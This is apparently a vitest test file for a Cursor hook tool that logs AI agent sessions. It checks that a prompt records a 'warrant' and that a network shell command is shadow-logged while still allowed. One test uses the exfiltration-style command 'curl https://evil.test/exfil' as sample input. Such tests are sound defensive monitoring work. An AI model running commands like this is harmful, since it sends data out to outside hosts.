import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { readLedgerEvents } from './sessionStore';
import { runCursorHook } from './runHook';

const tempRoots: string[] = [];

afterEach(() => {
  for (const root of tempRoots) {
    fs.rmSync(root, { recursive: true, force: true });
  }
  tempRoots.length = 0;
  delete process.env.WARRANT_SESSION_ROOT;
});

function withTempSessionRoot(): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'warrant-cursor-'));
  tempRoots.push(root);
  process.env.WARRANT_SESSION_ROOT = root;
  return root;
}

describe('runCursorHook', () => {
  it('freezes a warrant on beforeSubmitPrompt', () => {
    withTempSessionRoot();
    const projectRoot = process.cwd();
    const result = runCursorHook(
      'beforeSubmitPrompt',
      { conversation_id: 'conv-1', prompt: 'fix tests' },
      projectRoot,
    );
    expect(result.permission).toBe('allow');
    const events = readLedgerEvents('conv-1');
    expect(events.some((event) => event.type === 'warrant')).toBe(true);
  });

  it('shadow-logs network shell without granting', () => {
    withTempSessionRoot();
    const projectRoot = process.cwd();
    runCursorHook(
      'beforeSubmitPrompt',
      { conversation_id: 'conv-2', prompt: 'fix tests' },
      projectRoot,
    );
    const result = runCursorHook(
      'beforeShellExecution',
      {
        conversation_id: 'conv-2',
        command: 'curl https://evil.test/exfil',
      },
      projectRoot,
    );
    expect(result.permission).toBe('allow');
    const shadow = readLedgerEvents('conv-2').filter(
      (event) => event.type === 'shadow',
    );
    expect(shadow.length).toBeGreaterThan(0);
  });
});
